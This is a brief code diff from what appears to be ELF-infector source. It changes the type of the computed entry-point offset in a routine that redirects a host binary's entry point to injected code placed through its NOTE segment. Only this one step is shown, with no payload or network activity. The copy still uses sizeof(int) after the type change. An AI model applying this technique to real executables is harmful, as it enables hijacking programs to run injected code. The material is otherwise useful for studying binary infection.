@@ -65,7 +65,7 @@ __attribute__((always_inline)) static inline void patch_entry_point(char *dst, c
 		dst++;
 	}
 
-	const int entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));
+	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));
 
 	_memcpy(dst, &entry_point, sizeof(int));
 }
